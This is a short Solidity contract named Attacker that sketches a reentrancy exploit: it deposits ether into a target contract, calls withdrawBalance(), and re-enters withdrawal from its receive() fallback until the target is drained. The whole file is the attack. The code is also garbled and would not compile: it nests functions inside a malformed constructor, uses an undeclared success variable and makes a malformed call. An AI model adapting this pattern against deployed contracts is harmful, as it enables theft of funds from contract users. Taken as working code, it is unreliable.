contract Attacker {

    address public target;

    constructor(address _target); {
        function attack() public payable {
            target.call{value: msg.value}("");
            require(success, "Deposit Invalid");

            target.call(abi.encodeWithSignature("withdrawBalance()"));
            require(success, "Reentrancy Invalid");
        }

        receive() external payable {
            if (address(target).balance > 0)
            target.call(withdrawBalance);
        }
    }
}